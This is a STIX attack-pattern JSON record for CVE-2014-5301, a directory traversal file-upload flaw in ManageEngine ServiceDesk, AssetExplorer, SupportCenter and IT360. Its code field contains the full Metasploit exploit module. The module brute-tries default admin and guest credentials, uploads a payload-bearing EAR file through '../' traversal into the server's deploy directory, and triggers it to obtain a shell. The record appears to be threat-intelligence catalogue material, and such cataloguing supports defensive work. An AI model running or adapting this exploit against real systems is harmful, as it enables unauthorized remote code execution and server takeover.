{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9b9670df-4e91-4365-80f2-fcac1df5a0ed",
    "created": "2024-08-14T17:09:50.447293Z",
    "modified": "2024-08-14T17:09:50.447297Z",
    "name": "ManageEngine Multiple Products Authenticated File Upload",
    "description": " This module exploits a directory traversal vulnerability in ManageEngine ServiceDesk AssetExplorer, SupportCenter and IT360 when uploading attachment files. The JSP that accepts the upload does not handle correctly '../' sequences, which can be abused to write to the file system. Authentication is needed to exploit this vulnerability, but this module will attempt to login using the default credentials for the administrator and guest accounts. Alternatively, you can provide a pre-authenticated cookie or a username / password. For IT360 targets, enter the RPORT of the ServiceDesk instance (usually 8400). All versions of ServiceDesk prior v9 build 9031 (including MSP but excluding v4), AssetExplorer SupportCenter and IT360 (including MSP) are vulnerable. At the time of release of this module, only ServiceDesk v9 has been fixed in build 9031 and above. This module has been tested successfully in Windows and Linux on several versions. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/manageengine_auth_upload.rb",
            "external_id": "manageengine_auth_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-5301"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2015/Jan/5"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'ManageEngine Multiple Products Authenticated File Upload',\n      'Description'   => %q{\n        This module exploits a directory traversal vulnerability in ManageEngine ServiceDesk,\n        AssetExplorer, SupportCenter and IT360 when uploading attachment files. The JSP that accepts\n        the upload does not handle correctly '../' sequences, which can be abused to write\n        to the file system. Authentication is needed to exploit this vulnerability, but this module\n        will attempt to login using the default credentials for the administrator and guest\n        accounts. Alternatively, you can provide a pre-authenticated cookie or a username / password.\n        For IT360 targets, enter the RPORT of the ServiceDesk instance (usually 8400). All\n        versions of ServiceDesk prior v9 build 9031 (including MSP but excluding v4), AssetExplorer,\n        SupportCenter and IT360 (including MSP) are vulnerable. At the time of release of this\n        module, only ServiceDesk v9 has been fixed in build 9031 and above. This module has\n        been tested successfully in Windows and Linux on several versions.\n      },\n      'Author'        =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability Discovery and Metasploit module\n        ],\n      'License'       => MSF_LICENSE,\n      'References'    =>\n        [\n          ['CVE', '2014-5301'],\n          ['OSVDB', '116733'],\n          ['URL', 'https://seclists.org/fulldisclosure/2015/Jan/5']\n        ],\n      'DefaultOptions' => { 'WfsDelay' => 30 },\n      'Privileged'     => false, # Privileged on Windows but not on Linux targets\n      'Platform'       => 'java',\n      'Arch'           => ARCH_JAVA,\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n          [ 'ServiceDesk Plus v5-v7.1 < b7016/AssetExplorer v4/SupportCenter v5-v7.9',\n            {\n              'attachment_path' => '/workorder/Attachment.jsp'\n            }\n          ],\n          [ 'ServiceDesk Plus/Plus MSP v7.1 >= b7016 - v9.0 < b9031/AssetExplorer v5-v6.1',\n            {\n              'attachment_path' => '/common/FileAttachment.jsp'\n            }\n          ],\n          [ 'IT360 v8-v10.4',\n            {\n              'attachment_path' => '/common/FileAttachment.jsp'\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-12-15'))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('JSESSIONID',\n          [false, 'Pre-authenticated JSESSIONID cookie (non-IT360 targets)']),\n        OptString.new('IAMAGENTTICKET',\n          [false, 'Pre-authenticated IAMAGENTTICKET cookie (IT360 target only)']),\n        OptString.new('USERNAME',\n          [true, 'The username to login as', 'guest']),\n        OptString.new('PASSWORD',\n          [true, 'Password for the specified username', 'guest']),\n        OptString.new('DOMAIN_NAME',\n          [false, 'Name of the domain to logon to'])\n      ])\n  end\n\n\n  def get_version\n    res = send_request_cgi({\n      'uri'    => '/',\n      'method' => 'GET'\n    })\n\n    # Major version, minor version, build and product (sd = servicedesk; ae = assetexplorer; sc = supportcenterl; it = it360)\n    version = [ 9999, 9999, 0, 'sd' ]\n\n    if res && res.code == 200\n      if res.body.to_s =~ /ManageEngine ServiceDesk/\n        if res.body.to_s =~ /&nbsp;&nbsp;\\|&nbsp;&nbsp;([0-9]{1}\\.{1}[0-9]{1}\\.?[0-9]*)/\n          output = $1\n          version = [output[0].to_i, output[2].to_i, '0', 'sd']\n        end\n        if res.body.to_s =~ /src='\\/scripts\\/Login\\.js\\?([0-9]+)'><\\/script>/     # newer builds\n          version[2] = $1.to_i\n        elsif res.body.to_s =~ /'\\/style\\/style\\.css', '([0-9]+)'\\);<\\/script>/   # older builds\n          version[2] = $1.to_i\n        end\n      elsif res.body.to_s =~ /ManageEngine AssetExplorer/\n        if res.body.to_s =~ /ManageEngine AssetExplorer &nbsp;([0-9]{1}\\.{1}[0-9]{1}\\.?[0-9]*)/ ||\n            res.body.to_s =~ /<div class=\"login-versioninfo\">version&nbsp;([0-9]{1}\\.{1}[0-9]{1}\\.?[0-9]*)<\\/div>/\n          output = $1\n          version = [output[0].to_i, output[2].to_i, 0, 'ae']\n        end\n        if res.body.to_s =~ /src=\"\\/scripts\\/ClientLogger\\.js\\?([0-9]+)\"><\\/script>/\n          version[2] = $1.to_i\n        end\n      elsif res.body.to_s =~ /ManageEngine SupportCenter Plus/\n        # All of the vulnerable sc installations are \"old style\", so we don't care about the major / minor version\n        version[3] = 'sc'\n        if res.body.to_s =~ /'\\/style\\/style\\.css', '([0-9]+)'\\);<\\/script>/\n          # ... but get the build number if we can find it\n          version[2] = $1.to_i\n        end\n      elsif res.body.to_s =~ /\\/console\\/ConsoleMain\\.cc/\n        # IT360 newer versions\n        version[3] = 'it'\n      end\n    elsif res && res.code == 302 && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})/\n      # IT360 older versions, not a very good detection string but there is no alternative?\n      version[3] = 'it'\n    end\n\n    version\n  end\n\n\n  def check\n    version = get_version\n    # TODO: put fixed version on the two ifs below once (if...) products are fixed\n    # sd was fixed on build 9031\n    # ae and sc still not fixed\n    if (version[0] <= 9 && version[0] > 4 && version[2] < 9031 && version[3] == 'sd') ||\n    (version[0] <= 6 && version[2] < 99999 && version[3] == 'ae') ||\n    (version[3] == 'sc' && version[2] < 99999)\n      return Exploit::CheckCode::Appears\n    end\n\n    if (version[2] > 9030 && version[3] == 'sd') ||\n        (version[2] > 99999 && version[3] == 'ae') ||\n        (version[2] > 99999 && version[3] == 'sc')\n      return Exploit::CheckCode::Safe\n    else\n      # An IT360 check always lands here, there is no way to get the version easily\n      return Exploit::CheckCode::Unknown\n    end\n  end\n\n\n  def authenticate_it360(port, path, username, password)\n    if datastore['DOMAIN_NAME'] == nil\n      vars_post = {\n        'LOGIN_ID' => username,\n        'PASSWORD' => password,\n        'isADEnabled' => 'false'\n      }\n    else\n      vars_post = {\n        'LOGIN_ID' => username,\n        'PASSWORD' => password,\n        'isADEnabled' => 'true',\n        'domainName' => datastore['DOMAIN_NAME']\n      }\n    end\n\n    res = send_request_cgi({\n      'rport'  => port,\n      'method' => 'POST',\n      'uri'    => normalize_uri(path),\n      'vars_get' => {\n        'service'   => 'ServiceDesk',\n        'furl'      => '/',\n        'timestamp' => Time.now.to_i\n      },\n      'vars_post' => vars_post\n    })\n\n    if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})=([\\w]{9,})/\n      # /IAMAGENTTICKET([A-Z]{0,4})=([\\w]{9,})/ -> this pattern is to avoid matching \"removed\"\n      return res.get_cookies\n    else\n      return nil\n    end\n  end\n\n\n  def get_it360_cookie_name\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(\"/\")\n    })\n    cookie = res.get_cookies\n    if cookie =~ /IAMAGENTTICKET([A-Z]{0,4})/\n      return $1\n    else\n      return nil\n    end\n  end\n\n\n  def login_it360\n    # Do we already have a valid cookie? If yes, just return that.\n    if datastore['IAMAGENTTICKET']\n      cookie_name = get_it360_cookie_name\n      cookie = 'IAMAGENTTICKET' + cookie_name + '=' + datastore['IAMAGENTTICKET'] + ';'\n      return cookie\n    end\n\n    # get the correct path, host and port\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri('/')\n    })\n\n    if res && res.redirect?\n      uri = [ res.redirection.port, res.redirection.path ]\n    else\n      return nil\n    end\n\n    cookie = authenticate_it360(uri[0], uri[1], datastore['USERNAME'], datastore['PASSWORD'])\n\n    if cookie != nil\n      return cookie\n    elsif datastore['USERNAME'] == 'guest' && datastore['JSESSIONID'] == nil\n      # we've tried with the default guest password, now let's try with the default admin password\n      cookie = authenticate_it360(uri[0], uri[1], 'administrator', 'administrator')\n      if cookie != nil\n        return cookie\n      else\n        # Try one more time with the default admin login for some versions\n        cookie = authenticate_it360(uri[0], uri[1], 'admin', 'admin')\n        if cookie != nil\n          return cookie\n        end\n      end\n    end\n\n    nil\n  end\n\n\n  #\n  # Authenticate and validate our session cookie. We need to submit credentials to\n  # j_security_check and then follow the redirect to HomePage.do to create a valid\n  # authenticated session.\n  #\n  def authenticate(cookie, username, password)\n    res = send_request_cgi!({\n      'method' => 'POST',\n      'uri' => normalize_uri('/j_security_check;' + cookie.to_s.gsub(';', '')),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'cookie' => cookie,\n      'vars_post' => {\n        'j_username' => username,\n        'j_password' => password,\n        'logonDomainName' => datastore['DOMAIN_NAME']\n      }\n    })\n    if res && (res.code == 302 || (res.code == 200 && res.body.to_s =~ /redirectTo=\"\\+'HomePage\\.do';/))\n      # sd and ae respond with 302 while sc responds with a 200\n      return true\n    else\n      return false\n    end\n  end\n\n\n  def login\n    # Do we already have a valid cookie? If yes, just return that.\n    if datastore['JSESSIONID'] != nil\n      cookie = 'JSESSIONID=' + datastore['JSESSIONID'].to_s + ';'\n      return cookie\n    end\n\n    # First we get a valid JSESSIONID to pass to authenticate()\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri('/')\n    })\n    if res && res.code == 200\n      cookie = res.get_cookies\n      authenticated = authenticate(cookie, datastore['USERNAME'], datastore['PASSWORD'])\n      if authenticated\n        return cookie\n      elsif datastore['USERNAME'] == 'guest' && datastore['JSESSIONID'] == nil\n        # we've tried with the default guest password, now let's try with the default admin password\n        authenticated = authenticate(cookie, 'administrator', 'administrator')\n        if authenticated\n          return cookie\n        else\n          # Try one more time with the default admin login for some versions\n          authenticated = authenticate(cookie, 'admin', 'admin')\n          if authenticated\n            return cookie\n          end\n        end\n      end\n    end\n\n    nil\n  end\n\n\n  def send_multipart_request(cookie, payload_name, payload_str)\n    if payload_name =~ /\\.ear/\n      upload_path = '../../server/default/deploy'\n    else\n      upload_path = rand_text_alpha(4+rand(4))\n    end\n\n    post_data = Rex::MIME::Message.new\n\n    if @my_target == targets[1]\n      # old style\n      post_data.add_part(payload_str, 'application/octet-stream', 'binary', \"form-data; name=\\\"#{Rex::Text.rand_text_alpha(4+rand(4))}\\\"; filename=\\\"#{payload_name}\\\"\")\n      post_data.add_part(payload_name, nil, nil, \"form-data; name=\\\"filename\\\"\")\n      post_data.add_part('', nil, nil, \"form-data; name=\\\"vecPath\\\"\")\n      post_data.add_part('', nil, nil, \"form-data; name=\\\"vec\\\"\")\n      post_data.add_part('AttachFile', nil, nil, \"form-data; name=\\\"theSubmit\\\"\")\n      post_data.add_part('WorkOrderForm', nil, nil, \"form-data; name=\\\"formName\\\"\")\n      post_data.add_part(upload_path, nil, nil, \"form-data; name=\\\"component\\\"\")\n      post_data.add_part('Attach', nil, nil, \"form-data; name=\\\"ATTACH\\\"\")\n    else\n      post_data.add_part(upload_path, nil, nil, \"form-data; name=\\\"module\\\"\")\n      post_data.add_part(payload_str, 'application/octet-stream', 'binary', \"form-data; name=\\\"#{Rex::Text.rand_text_alpha(4+rand(4))}\\\"; filename=\\\"#{payload_name}\\\"\")\n      post_data.add_part('', nil, nil, \"form-data; name=\\\"att_desc\\\"\")\n    end\n\n    data = post_data.to_s\n    res = send_request_cgi({\n      'uri' => normalize_uri(@my_target['attachment_path']),\n      'method' => 'POST',\n      'data' => data,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'cookie' => cookie\n    })\n    return res\n  end\n\n\n  def pick_target\n    return target if target.name != 'Automatic'\n\n    version = get_version\n    if (version[0] <= 7 && version[2] < 7016 && version[3] == 'sd') ||\n    (version[0] == 4 && version[3] == 'ae') ||\n    (version[3] == 'sc')\n      # These are all \"old style\" versions (sc is always old style)\n      return targets[1]\n    elsif version[3] == 'it'\n      return targets[3]\n    else\n      return targets[2]\n    end\n  end\n\n\n  def exploit\n    if check == Exploit::CheckCode::Safe\n      fail_with(Failure::NotVulnerable, \"#{peer} - Target not vulnerable\")\n    end\n\n    print_status(\"Selecting target...\")\n    @my_target = pick_target\n    print_status(\"Selected target #{@my_target.name}\")\n\n    if @my_target == targets[3]\n      cookie = login_it360\n    else\n      cookie = login\n    end\n\n    if cookie.nil?\n      fail_with(Failure::Unknown, \"#{peer} - Failed to authenticate\")\n    end\n\n    # First we generate the WAR with the payload...\n    war_app_base = rand_text_alphanumeric(4 + rand(32 - 4))\n    war_payload = payload.encoded_war({ :app_name => war_app_base })\n\n    # ... and then we create an EAR file that will contain it.\n    ear_app_base = rand_text_alphanumeric(4 + rand(32 - 4))\n    app_xml = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\"\n    app_xml << '<application>'\n    app_xml << \"<display-name>#{rand_text_alphanumeric(4 + rand(32 - 4))}</display-name>\"\n    app_xml << \"<module><web><web-uri>#{war_app_base + \".war\"}</web-uri>\"\n    app_xml << \"<context-root>/#{ear_app_base}</context-root></web></module></application>\"\n\n    # Zipping with CM_STORE to avoid errors while decompressing the zip\n    # in the Java vulnerable application\n    ear_file = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)\n    ear_file.add_file(war_app_base + '.war', war_payload.to_s)\n    ear_file.add_file('META-INF/application.xml', app_xml)\n    ear_file_name = rand_text_alphanumeric(4 + rand(32 - 4)) + '.ear'\n\n    if @my_target != targets[3]\n      # Linux doesn't like it when we traverse non existing directories,\n      # so let's create them by sending some random data before the EAR.\n      # (IT360 does not have a Linux version so we skip the bogus file for it)\n      print_status(\"Uploading bogus file...\")\n      res = send_multipart_request(cookie, rand_text_alphanumeric(4 + rand(32 - 4)), rand_text_alphanumeric(4 + rand(32 - 4)))\n      if res && res.code != 200\n        fail_with(Failure::Unknown, \"#{peer} - Bogus file upload failed\")\n      end\n    end\n\n    # Now send the actual payload\n    print_status(\"Uploading EAR file...\")\n    res = send_multipart_request(cookie, ear_file_name, ear_file.pack)\n    if res && res.code == 200\n      print_good(\"Upload appears to have been successful\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - EAR upload failed\")\n    end\n\n    10.times do\n      select(nil, nil, nil, 2)\n\n      # Now make a request to trigger the newly deployed war\n      print_status(\"Attempting to launch payload in deployed WAR...\")\n      res = send_request_cgi({\n        'uri'    => normalize_uri(ear_app_base, war_app_base, Rex::Text.rand_text_alpha(rand(8)+8)),\n        'method' => 'GET'\n      })\n      # Failure. The request timed out or the server went away.\n      break if res.nil?\n      # Success! Triggered the payload, should have a shell incoming\n      break if res.code == 200\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-12-15",
    "x_mitre_platforms": [
        "java'"
    ]
}